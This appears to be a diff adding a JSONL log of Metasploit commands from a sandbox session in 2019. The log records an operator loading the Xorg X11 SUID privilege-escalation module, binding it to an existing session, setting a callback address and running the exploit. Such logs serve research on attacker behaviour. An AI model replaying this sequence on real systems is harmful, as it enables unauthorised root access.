@@ -1,0 +1,7 @@
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:28:40.371752Z", "cmd_type": "msf-command", "cmd": "search 14665"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:28:52.607279Z", "cmd_type": "msf-command", "cmd": "use exploit/multi/local/xorg_x11_suid_server "}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:28:54.509851Z", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:29:00.134421Z", "cmd_type": "msf-command", "cmd": "set session 1"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:29:34.268122Z", "cmd_type": "msf-command", "cmd": "set lhost 10.0.135.83"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:29:36.753174Z", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:29:51.674549Z", "cmd_type": "msf-command", "cmd": "exploit "}
